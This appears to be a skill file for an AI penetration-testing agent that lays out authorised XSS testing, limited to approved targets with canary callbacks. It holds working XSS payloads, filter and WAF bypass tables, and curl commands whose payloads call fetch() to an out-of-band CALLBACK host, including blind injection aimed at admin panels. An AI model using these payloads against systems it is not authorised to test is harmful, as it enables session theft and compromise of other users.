---
name: harness-xss
description: "Test reflected, stored, DOM and blind XSS with context-aware payloads, WAF bypass, and OOB confirmation. One injection point per attempt, one context per payload."
---

# XSS deep — context-aware, OOB-confirmed

Source: `testing-for-xss`, `dom-based-xss`, `waf-bypass-xss` (2024: mutation XSS, DOM clobbering, Trusted Types bypass).

## Gate

Approved `host+parameter+injection point` only. Every command via `cyber_process` `argv`. One parameter, one context, one payload per request. No credential theft, no session hijack — canary callback only. → `harness-vuln-triage` before `cyber_finding`.

## Steps

### 1. Context detection (mandatory before any payload)

Inject a benign canary (`XSSCANARY<random8>`) in the target parameter. Read the response and classify where the canary lands:

| Context | Canary appears in… | Breakout strategy |
|---|---|---|
| HTML body | `<div>CANARY</div>` | `<img src=x onerror=…>`, `<svg/onload=…>` |
| HTML attribute (unquoted) | `<input value=CANARY` | `autofocus onfocus=…` |
| HTML attribute (single) | `<input value='CANARY'` | `' onfocus=… '` |
| HTML attribute (double) | `<input value="CANARY"` | `" onfocus=… "` |
| HTML attribute (href/src) | `<a href="CANARY"` | `javascript:…`, `data:text/html,…` |
| JS string (single) | `var x='CANARY'` | `'-alert(1)-'`, `</script><script>…` |
| JS string (double) | `var x="CANARY"` | `"-alert(1)-"` |
| JS template literal | `` var x=`CANARY` `` | `${alert(1)}` |
| Inside `<script>` block | `if(CANARY)` | Direct JS: `};alert(1)//` |
| CSS value | `color: CANARY` | `expression()`, `url()` (IE), `-moz-binding` |
| URL parameter reflection | `?q=CANARY` in `<meta>` | `"><script>…` or `javascript:` |
| JSON response | `{"key":"CANARY"}` | `</script>` injection, prototype pollution |
| AngularJS template | `{{CANARY}}` | `{{constructor.constructor('alert(1)')()}}` |
| Vue/React dangerouslySetInnerHTML | Component prop | Framework-specific escape |

Record context as its own observation. **Never send a payload without knowing the context.**

### 2. Canary injection — context discovery

```
cyber_process argv=["curl","-sS","-D","-","-o","canary-response.html","<url>/endpoint?q=XSSCANARY<random8>"]
```

Read the response and locate the canary. Record the exact context (HTML body, attribute, JS string, etc.) as its own observation.

### 3. Filter and encoding probes

```
cyber_process argv=["curl","-sS","-D","-","-o","filter-chars.html","<url>/endpoint?q=%3C%3E%22%27%2F()%7B%7D"]
cyber_process argv=["curl","-sS","-D","-","-o","filter-tag.html","<url>/endpoint?q=%3Cscript%3E"]
cyber_process argv=["curl","-sS","-D","-","-o","filter-event.html","<url>/endpoint?q=onerror"]
cyber_process argv=["curl","-sS","-D","-","-o","filter-html.html","<url>/endpoint?q=CANARY%3Cbr%3ECANARY"]
```

For each, check what is encoded, stripped, or passed through. Build the bypass map:

| Filter | Bypass candidates |
|---|---|
| `<script>` blocked | `<img>`, `<svg>`, `<details/open/ontoggle>`, `<body/onload>` |
| `on*` events blocked | `<a href=javascript:…>`, `<iframe srcdoc=…>`, `<math>` |
| `()` blocked | `` ``.constructor.constructor`alert\x281\x29` ``, `onerror=alert&lpar;1&rpar;` |
| Case-sensitive filter | `<ScRiPt>`, `<IMG SRC=x ONERROR=…>` |
| Double-encoding | `%253C` → `<` after server decodes twice |
| WAF (Cloudflare/Akamai) | Chunked encoding, `\t\n` in tags, Unicode normalization |
| CSP `script-src` | JSONP callback on whitelisted origin, `base-uri` hijack |

### 4. Payload delivery — reflected XSS

For HTML body context:

```
cyber_process argv=["curl","-sS","-D","-","<url>/endpoint?q=%3Cimg+src%3Dx+onerror%3Dfetch('https%3A%2F%2FCALLBACK%2Fxss-UNIQUE')%3E"]
```

For attribute context (double-quoted):

```
cyber_process argv=["curl","-sS","-D","-","<url>/endpoint?q=%22+onfocus%3Dfetch('https%3A%2F%2FCALLBACK%2Fxss-UNIQUE')+autofocus+%22"]
```

For JS string context:

```
cyber_process argv=["curl","-sS","-D","-","<url>/endpoint?q=%3C%2Fscript%3E%3Cscript%3Efetch('https%3A%2F%2FCALLBACK%2Fxss-UNIQUE')%3C%2Fscript%3E"]
```

For href/src context:

```
cyber_process argv=["curl","-sS","-D","-","<url>/endpoint?q=javascript:fetch('https%3A%2F%2FCALLBACK%2Fxss-UNIQUE')"]
```

Execution proof = OOB callback with correlation ID, not visual observation.

### 5. Payload delivery — stored XSS

Inject payload via the store endpoint (profile, comment, etc.):

```
cyber_process argv=["curl","-sS","-D","-","-X","POST","-H","Content-Type: application/json","-H","Cookie: <session>","-d","{\"comment\":\"<img src=x onerror=fetch('https://CALLBACK/stored-UNIQUE')>\"}","<url>/api/comments"]
```

Then fetch the render page to trigger:

```
cyber_process argv=["curl","-sS","-D","-","<url>/page-with-comments"]
```

Check CALLBACK for the stored XSS hit.

### 6. Payload delivery — blind XSS

Inject into fields processed by another user (admin panel, support tickets):

```
cyber_process argv=["curl","-sS","-D","-","-X","POST","-H","Content-Type: application/json","-d","{\"name\":\"<img src=x onerror=fetch('https://CALLBACK/blind-UNIQUE')>\",\"message\":\"test\"}","<url>/api/contact"]
```

Wait for OOB callback. If received → blind XSS confirmed in the admin/processing interface.

### 4. DOM XSS specific

If source analysis (harness-source-deep) identified DOM sinks:
1. Trace the taint: source (`location.hash`, `postMessage`, `document.cookie`, `localStorage`) → sink (`innerHTML`, `outerHTML`, `document.write`, `eval`, `Function`, `setTimeout(string)`, `insertAdjacentHTML`, `jQuery.html()`).
2. Check for sanitizers in the path (DOMPurify, sanitize-html, framework escaping).
3. If no sanitizer or bypassable: craft payload for the specific sink.
4. `cyber_capture` the DOM state showing the injected node.

### 7. Negative controls

```
cyber_process argv=["curl","-sS","-D","-","<url>/endpoint?q=benign-safe-text"]
cyber_process argv=["curl","-sS","-D","-","<url>/endpoint?other_param=%3Cimg+src%3Dx+onerror%3Dfetch('https%3A%2F%2FCALLBACK%2Fxss-CTRL')%3E"]
cyber_process argv=["curl","-sS","-D","-","<url>/endpoint?q=%3Cimg+src%3Dx+onerr%3Dfetch('https%3A%2F%2FCALLBACK%2Fxss-BROKEN')%3E"]
```

| Control | Description | Expected |
|---|---|---|
| Benign value | safe text, no tags | no callback, no reflection |
| Non-reflected param | payload on parameter that doesn't reflect | no callback |
| Broken syntax | `onerr=` instead of `onerror=` | no callback, no execution |

### 8. Evidence assembly

`cyber_finding` with:
- `evidence`: canary context observation + filter probes + payload observation + OOB callback + reproduction + all 3 negative controls
- `sources`: the response chunk showing the unescaped payload in context
- `checks`: context:positive-control, payload:reproduction, benign-value:negative-control, broken-syntax:negative-control, callback:contains correlation ID
- `impact`: cookie theft feasibility (HttpOnly?), session hijack (SameSite?), stored vs reflected scope

## Verification scenarios

| Scenario | Observation | Expected classification |
|---|---|---|
| Canary reflected unescaped in HTML body | `<div>XSSCANARY</div>` in response | HTML body context confirmed |
| Canary HTML-encoded in response | `&lt;` instead of `<` | context safe from tag injection |
| `<img onerror=` reflected + OOB callback received | CALLBACK log with xss-UNIQUE | reflected XSS candidate |
| `<img onerror=` reflected but no callback | payload in body, no OOB | reflection only, not execution |
| Stored payload triggers on render page | CALLBACK log with stored-UNIQUE | stored XSS candidate |
| Blind payload triggers from admin context | CALLBACK log with blind-UNIQUE | blind XSS candidate |
| JS string breakout + OOB callback | `</script><script>fetch(...)` executes | JS context XSS candidate |
| Filter strips `<script>` but passes `<img>` | `<img>` in response | filter bypass signal |
| WAF blocks all tags | 403 or stripped body | WAF active, try encoding bypass |
| CSP blocks inline script | no callback despite reflection | CSP effective (combine with harness-headers) |
| Benign value → no callback | clean response | negative control confirmed |
| Broken syntax `onerr=` → no callback | payload in body, no execution | negative control confirmed |

A reflected canary is a lead. The finding is the **executed payload** with OOB confirmation or DOM capture.

### WAF bypass protocol

If initial payloads are blocked:
1. Identify the WAF (response headers, body patterns, `wafw00f`).
2. Try encoding mutations: HTML entities, URL encoding, Unicode, null bytes.
3. Try tag mutations: uncommon tags (`<details>`, `<math>`, `<foreignObject>`), SVG.
4. Try event mutations: lesser-known events (`ontoggle`, `onpointerenter`, `onfocusin`).
5. Try delivery mutations: chunked encoding, multipart, `Transfer-Encoding` tricks.
6. Record each bypass attempt as its own observation — a WAF block is data, not failure.

## Proof contract

A finding needs: (1) identified injection context, (2) filter/encoding map, (3) executed payload with OOB confirmation or DOM capture, (4) reproduction with fresh correlation ID, (5) three negative controls. A reflected canary alone is a lead, not a finding.

## Done

Each XSS cites the injection context, the filter bypass, the execution proof (OOB or DOM capture), and the negative controls. `200` with reflected input is never enough.
